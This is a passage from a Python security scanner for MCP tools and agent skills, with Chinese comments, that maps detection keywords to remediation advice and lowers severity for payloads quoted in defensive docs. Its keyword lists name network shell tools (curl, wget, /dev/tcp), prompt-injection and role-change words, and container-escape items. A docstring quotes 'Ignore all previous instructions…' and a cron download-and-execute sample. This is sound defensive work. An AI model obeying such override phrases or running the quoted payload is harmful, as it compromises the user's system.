    # 顺序反了会把这些 finding 的修复建议写成「改用参数化调用」。
    (("ignore", "jailbreak", "bypass", "forget"), "提示注入：把外部内容当作不可信数据而非指令，显式声明边界，并对输出做二次校验"),
    (("忽略", "跳过", "扮演", "假装", "取消", "复述", "重复", "系统指令", "不要", "作为"), "提示注入：把外部内容当作不可信数据而非指令，显式声明边界，并对输出做二次校验"),
    (("u200b", "u200c", "u200d", "u2060", "ufeff", "x25b", "x25c", "x25d"), "清除零宽字符与隐藏 Unicode：描述与正文只能包含可见字符，这些字符正是用来夹带指令的"),
    (("npx",), "禁止 npx 从远程 URL 自动安装即执行：提交 lockfile 并用 npm ci 安装已审计的本地依赖"),
    (("curl", "wget", "/dev/tcp", "base64 -d"), "移除「下载即执行」：先下载再校验哈希后执行，或改为依赖已发布的包"),
    (("postinstall", "preinstall", "postpublish"), "禁用或人工审计安装期脚本，用 --ignore-scripts 安装后单独 review hook"),
    (("exec", "eval", "os.system", "system", "subprocess", "child_process", "popen", "spawn"), "移除命令执行拼接，改用参数化调用（execFile/子进程参数列表）或白名单命令，且不接受用户输入直接进入"),
    (("chmod(",), "不要给文件或目录设 777：按实际用途收敛到最小权限"),
    (("permission", "all_urls", "host_permission"), "把通配符/全 URL 权限换成明确的域名与路径白名单"),
    (("environ", "process.env", ".env"), "不要全量导出环境变量；按最小必要读取指定键，且不要把 env 打进日志"),
    (("requests", "axios", "fetch", "urlopen", "urllib", "socket", "webSocket"), "审查每处网络请求的目标域名，接入 URL 白名单，禁止向不可信地址发送数据"),
    (("pickle", "yaml.load", "marshal", "shelve"), "禁止对不可信数据反序列化，改用 JSON 或带 safe_load 的解析器"),
    (("verify=false", "insecure", "cert_none", "rejectunauthorized"), "启用 TLS 证书校验，不要用 -k / verify=False 绕过证书验证"),
    (("0.0.0.0",), "不要把服务绑定到所有网卡，仅绑定本机或内网地址并配合防火墙"),
    (("sudo", "setuid", "chown"), "移除不必要的提权调用，把特权操作收敛到单独的最小权限步骤"),
    (("remove|rename", "fs.(read", "path(", "shutil."), "收敛文件写权限到实际需要的目录，避免暴露完整文件系统操作能力"),
    # ── 容器与沙箱逃逸面 ──
    (("privileged", "docker.sock", "var/run/docker", "cap_add", "capsysadmin",
      "hostpath", "hostnetwork", "hostpid", "hostipc", "unconfined", "userns",
      "--cap-add", "--network", "--pid", "--ipc"),
     "以最小特权运行容器：去掉 --privileged / cap-add ALL，宿主目录改为只读挂载，"
     "网络与 PID/IPC namespace 与宿主隔离，绝不挂载 docker.sock"),
    # ── 路径穿越 ──
    (("../", "%2e%2e"), "对用户输入的路径做规范化并校验是否落在允许目录内，拒绝 .. 穿越与 URL 编码变体"),
    # ── CORS 通配 ──
    (("access-control-allow-origin", "cors("), "禁止 CORS 通配符与 credentials 同用，按具体来源白名单收敛"),
    # ── 代理自主性（ASI）──
    (("exploit", "fuzz", "vulnerab"), "禁止代理自主生成或执行漏洞利用：降级为需要人工审批的分析任务，并限制其在隔离环境中运行"),
    (("eth_", "web3", "wallet", "solana", "metamask", "ledger", "mnemonic", "seed_phrase", "keystore", "0x[a-f"),
     "代理不应持有或操作私钥/钱包：签名与转账移到受控的密钥托管，并加人工审批与金额上限"),
    (("load_adapter", "load_lora", "add_adapter", "set_adapter", "from_pretrained",
      "merge_and_unload", "peft"),
     "禁止从不可信源加载模型权重或 LoRA 适配器：加载前校验来源与完整性，只允许登记过的仓库"),
    (("记忆", "轨迹", "trajectory", "experience", "persist", "自启动", "定时任务", "后门", "守护进程"),
     "对持久化写入（记忆/配置/自启动项）加白名单与审批，禁止代理自主改写自身指令或环境"),
    (("发送", "上传", "传输", "提交", "泄露", "外传"), "禁止把用户数据外发到非白名单地址：所有外发需记录来源、目的地与审批记录"),
    (("防火墙", "杀毒", "停用", "禁用", "关闭"), "禁止关闭防火墙/杀毒/安全监控：安全组件开关必须由独立管理面控制，代理无权自改"),
    (("roleplay", "pretend", "act as", "play as"), "提示注入：把外部内容当作不可信数据而非指令，显式声明边界，并对输出做二次校验"),
    (("bdan", "忘记", "无视", "突破", "解除", "变成"), "提示注入：把外部内容当作不可信数据而非指令，显式声明边界，并对输出做二次校验"),
    (("访问|获取|读取",), "限制读取范围到实际需要的最小数据集，拒绝读取用户/系统/环境全量数据"),
    (("fastboot", "idevice", "simctl", "frida", "adb"), "设备级操作（刷机/模拟器/越狱调试/adb shell）必须在隔离测试机上执行，不得暴露给代理默认可用环境"),
    (("autonom", "unattended", "self-driving", "self_generated", "selfgenerated",
      "self_modif", "self-modif", "self_modify"),
     "为自主行为加预算与审批闸门：限制最大步数、资源上限与可写范围，禁止无界自循环与自我修改"),
    (("build|construct|generate|compose",), "禁止代理自主生成可执行工件（exploit/脚本/配置）后直接执行，产出必须经人工审查"),
]


def _resolve_remediation(pattern, owasp_cat):
    """为一条命中规则解析出具体的修复动作。"""
    normalized = (pattern or "").replace("\\", "").lower()
    for needles, fix in _REMEDIATION_TOKENS:
        if any(n in normalized for n in needles):
            return fix
    if owasp_cat in _REMEDIATION_CATEGORY:
        return _REMEDIATION_CATEGORY[owasp_cat]
    if owasp_cat in _REMEDIATION_ASI:
        return _REMEDIATION_ASI[owasp_cat]
    return "移除或重构该处实现，并确认它确实属于必要的功能而不是遗留代码"


# 已知类别规则的「类别-序号」稳定 id。dict 插入序稳定，因此序号可复现。
_CATEGORY_SOURCES = [
    (SANDBOX_RULES, "SANDBOX"),
    (MCP01_RULES, "MCP01"), (MCP02_RULES, "MCP02"), (MCP03_RULES, "MCP03"),
    (MCP04_RULES, "MCP04"), (MCP05_RULES, "MCP05"), (MCP06_RULES, "MCP06"),
    (MCP07_RULES, "MCP07"), (MCP08_RULES, "MCP08"), (MCP09_RULES, "MCP09"),
    (MCP10_RULES, "MCP10"), (ASI01_RULES, "ASI01"), (ASI02_RULES, "ASI02"),
    (ASI03_RULES, "ASI03"), (ASI04_RULES, "ASI04"), (ASI05_RULES, "ASI05"),
    (ASI06_RULES, "ASI06"), (ASI07_RULES, "ASI07"), (ASI08_RULES, "ASI08"),
    (ASI09_RULES, "ASI09"), (ASI10_RULES, "ASI10"),
    (ZH_PROMPT_INJECTION_RULES, "ZHPI"), (SKILL_EXTRA_RULES, "SKILL"),
]
_PATTERN_RULE_ID = {}
for _src, _tag in _CATEGORY_SOURCES:
    for _i, _p in enumerate(_src, 1):
        _PATTERN_RULE_ID.setdefault(_p, "%s-%03d" % (_tag, _i))

import hashlib as _hashlib


# ============================================================
# 引用上下文抑制（citation context suppression）
# ============================================================
# 2026-09-18 基线审计发现：防御类文档把攻击载荷当作**被检测对象**引用时，
# 静态规则会照常命中，且在 SKILL.md 这类 agent 指令文件里不会走 is_doc 降级
# （analyze() 明确认为指令载荷"就是 agent 的代码"），所以一条**纯防御**的
# skill 文档会拿到一堆 critical 级 finding。
#
# 做法：不改任何正则（改正则是假阴性高发区），而是在 finding 生成时对命中点
# 前后的窗口做一次元语言检测。出现 detects/catches/blocks/such as/fixture/
# sample 这类词，说明规则命中的是"被讨论的载荷"而不是"被执行的动作"。
#
# 两个刻意的约束：
#   * 只用保守标记词表。宁可漏抑制，也不能把真攻击压成 info。
#   * `examples?|samples?|fixtures?` 前加 (?<![\w.]) —— 不加的话
#     attacker.example 会命中 examples?，把真实 curl 载荷误抑制掉
#     （2026-09-18 实测踩到这个坑）。
#   * 前向窗口只给 60 字符且共用同一词表。攻击载荷后的续句（"then send the
#     data to https://"）不含任何标记词，所以不会因此被抑制。
_CITATION_BACK = 100
_CITATION_FWD = 60
_CITATION_MARKERS = re.compile(
    r"(?i)(?:\b(?:detects?|detecting|catches?|catching|blocks?|blocked|prevents?|"
    r"preventing|stops?|stopped|mitigat\w*|classif\w*|report(?:s|ed|ing)?|rumored|"
    r"mentioned?|documents?)\b"
    r"|\bsuch\s+as\b|\bpatterns?\s+like\b|\bfor\s+example\b|\be\.g\.?\b"
    r"|(?<![\w.])\b(?:fixtures?|samples?|examples?)\b"
    r"|\bis\s+the\s+canonical\b|\bused\s+(?:in\s+)?tests?\b|\bthreat\s+model\b"
    r"|\bdocs?\s*[:=]|\bdetection\s+fixture\b"
    # 中文标记：词表此前只有英文，中文防御文档整块盲区。本仓库与 distribution
    # 里的文档大量是中文（例如「它对每行 stdin 的请求返回响应，例如：」后面跟
    # 一个被 deny 的 cron 载荷），英文词表一个都匹配不上，导致注入家族豁免后
    # 这类「演示被拦截的载荷」被报成 high。逐词对应上面的英文语义，不含
    # 「防御」「如下」这类宽泛或祈使式词 —— 后者会把真攻击一起压掉。
    r"|检测|拦截|拦下|阻止|例如|示例|威胁模型|测试用例|测试样本|已知攻击|已知漏洞)"
)


def _is_citation_context(content, pos):
    """命中点是否处于引用/讨论语境（防御文档把载荷当作被检测对象）。"""
    lo = max(0, pos - _CITATION_BACK)
    hi = min(len(content), pos + _CITATION_FWD)
    return bool(_CITATION_MARKERS.search(content[lo:hi]))


def _rule_id(pattern, owasp_cat):
    """稳定 rule_id：已知类别用「类别-序号」，其余用正则哈希前缀（不随加载顺序漂移）。"""
    rid = _PATTERN_RULE_ID.get(pattern)
    if rid:
        return rid
    digest = _hashlib.md5(pattern.encode("utf-8")).hexdigest()[:4].upper()
    return "GEN-%s" % digest


_DOC_INJECTION_DESC_RE = re.compile(
    r"(?i)注入|越狱|忽略/覆盖前文|忘记一切|身份切换|角色扮演|系统提示|提示词"
    r"|prompt\s*injection|jailbreak|role.?play"
)


def _is_doc_severity_exempt(owasp_cat, desc):
    """这条规则命中在文档里时，是否不该被 is_doc 整档降级。

    豁免按**规则语义**判定，不是按 OWASP 类别。MCP06 类别里混着两类：

      * 提示词注入 / 越狱 / 角色扮演 / 系统提示窃取 —— 载荷天然住在文本与
        文档里（工具描述、检索到的网页、markdown、SKILL.md）。这些必须豁免：
        2026-09-20 实测指令面 28 条正样本在 serious-only 口径下召回 0/28，
        旗舰样本 "Ignore all previous instructions…" 只有 low。生产路径
        server.check_prompt_injection 对提示词文本本来就不施加文档降级。
      * 「持久化/自启动指令」(cron / launchd / 计划任务) —— 文档里给 cron 示例
        是正常实践，不能报 high。整类豁免会把 guardrail-harness 的 deny 演示
        样本（`"* * * * * curl evil | sh"`）报成阻断项。

    判别器是「这个类别的载荷天然住在文档里吗」，不是「它是不是 .md」。
    后者由 _is_citation_context 负责，两条机制各管一段。
    """
    if owasp_cat and owasp_cat.startswith("ASI"):
        return True
    return owasp_cat == "MCP06" and bool(_DOC_INJECTION_DESC_RE.search(desc or ""))


def analyze(files, tool_type="mcp"):
    """执行静态分析，返回findings和OWASP覆盖"""
    rules = get_all_rules(tool_type)
    findings = []

    for filepath, content in files.items():
        # 跳过非代码文件
        if any(filepath.endswith(ext) for ext in SKIP_EXTENSIONS):
            continue
        if any(filepath.split('/')[-1] == name for name in SKIP_NAMES):
            continue

        is_doc = filepath.endswith('.md') or filepath.endswith('.txt')
        # SKILL.md 这类指令载荷不算「文档」——它就是 agent 的代码
        if is_doc and is_agent_instruction_doc(filepath, content):
            is_doc = False

        # 同文件内的「同规则族 + 同一行」去重表。
        # 2026-10-02 实证：雷达规则会生成**描述完全相同**的多条 pattern（GEN-B9BB
        # 就同时存在两条），同一句文本因此产出两条逐字重复的 finding；同一 pattern
        # 的 `matches[:3]` 也会在同一个位置附近报出三条近似结果。报告推送与
        # ci_self_scan_gate 的计数都按 finding 条数走，重复会同时污染两者。
        # 去重键取「原始严重度档以下的稳定身份」：rule_id + 原始描述 + 行号。
        # 同一行但描述不同的两条攻击互不干扰（例如一行里既有注入又有 SSRF）。
        seen_findings = {}

        for pattern, (desc, severity) in rules.items():
            try:
                matches = list(re.finditer(pattern, content, re.IGNORECASE))
            except re.error:
                continue
            if matches:
                # 确定OWASP类别
                owasp_cat = _get_owasp_category(pattern)
                rid = _rule_id(pattern, owasp_cat)
                fix = _resolve_remediation(pattern, owasp_cat)
                for m in matches[:3]:  # 每模式最多3个匹配
                    line_num = content[:m.start()].count('\n') + 1
                    # 列号（1-based）：命中点在所属行内的偏移，方便编辑器直接跳转
                    col = m.start() - content.rfind('\n', 0, m.start())
                    actual_severity = severity
                    # 文档降级：README / docs 里出现「curl 示例」「localhost 用法」
                    # 「npx -y 安装命令」是正常文档实践，不能报 critical。但这类
                    # 降级**不适用于注入家族** —— 见 _DOC_SEVERITY_EXEMPT_CATEGORIES。
                    doc_exempt = _is_doc_severity_exempt(owasp_cat, desc)
                    if is_doc and not doc_exempt:
                        if severity in ("critical", "high"):
                            actual_severity = "low"
                        elif severity == "medium":
                            actual_severity = "info"
                    # 引用上下文：防御文档把载荷当被检测对象讨论时，命中不改变
                    # 规则本身，只降级并打标，便于报告层单独统计与用户复核。
                    # 只作用于 critical/high/medium —— info 已经是最低档，无需再降。
                    citation = _is_citation_context(content, m.start())
                    if citation and actual_severity in ("critical", "high", "medium"):
                        actual_severity = "low"
                    suffix = ""
                    if is_doc and not doc_exempt:
                        suffix += " (文档示例)"
                    if citation:
                        suffix += " (引用上下文)"

                    # 同规则族 + 同行 → 合并进已有 finding，不再新增一条。
                    # 被合并的 rule_id 记在 related_rule_ids 上，rid 信息不丢。
                    dedup_key = (rid, desc, line_num)
                    existing = seen_findings.get(dedup_key)
                    if existing is not None:
                        rel = existing.setdefault("related_rule_ids", [])
                        # 只记录与该条主 finding **不同** 的 rid：雷达规则里出现过
                        # 两条 pattern 摘要撞到同一个 GEN-xxxx 的情况，把自身 rid
                        # 写进去会让「重复来源」看起来像有一条真实来源。
                        if rid != existing.get("rule_id") and rid not in rel:
                            rel.append(rid)
                        continue

                    findings.append({
                        "type": "dangerous_pattern",
                        "rule_id": rid,
                        "severity": actual_severity,
                        "description": desc + suffix,
                        "file": filepath,
                        "lines": str(line_num),
                        "col": col,
                        "evidence": m.group()[:120],
                        "owasp_category": owasp_cat,
                        "remediation": fix,
                        "citation_context": citation,
                    })
                    seen_findings[dedup_key] = findings[-1]

    return {
        "findings": findings,
        "total_files": len(files),
        "patterns_checked": len(rules),
        "owasp_coverage": get_owasp_coverage(findings),
        "agentic_coverage": get_agentic_coverage(findings),
    }


def _get_owasp_category(pattern):
    """根据pattern所属的规则集确定OWASP类别"""
    if pattern in MCP01_RULES: return "MCP01"
    if pattern in MCP02_RULES: return "MCP02"
    if pattern in MCP03_RULES: return "MCP03"
    if pattern in MCP04_RULES: return "MCP04"
    if pattern in MCP05_RULES: return "MCP05"
    if pattern in MCP06_RULES: return "MCP06"
    if pattern in MCP07_RULES: return "MCP07"
    if pattern in MCP08_RULES: return "MCP08"
    if pattern in MCP09_RULES: return "MCP09"
    if pattern in MCP10_RULES: return "MCP10"
    if pattern in ASI01_RULES: return "ASI01"
    if pattern in ASI02_RULES: return "ASI02"
    if pattern in ASI03_RULES: return "ASI03"
    if pattern in ASI04_RULES: return "ASI04"
    if pattern in ASI05_RULES: return "ASI05"
    if pattern in ASI06_RULES: return "ASI06"
    if pattern in ASI07_RULES: return "ASI07"
    if pattern in ASI08_RULES: return "ASI08"
    if pattern in ASI09_RULES: return "ASI09"
    if pattern in ASI10_RULES: return "ASI10"
    return None